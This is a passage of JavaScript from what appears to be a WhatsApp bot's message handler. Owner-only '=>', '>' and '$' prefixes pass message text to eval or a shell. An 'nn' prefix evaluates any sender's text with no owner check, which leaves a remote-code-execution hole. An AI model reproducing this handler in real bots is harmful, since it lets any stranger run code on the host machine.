.join("\n\n")}`
: ""
}
`.trim();
xartva.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return xreply(bang)
}
try {
xreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
xreply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await xreply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return m.reply('Please input code to exec')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return xreply(`${err}`)
if (stdout) return xreply(stdout)
})
}
} catch (err) {
  console.log(err);
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
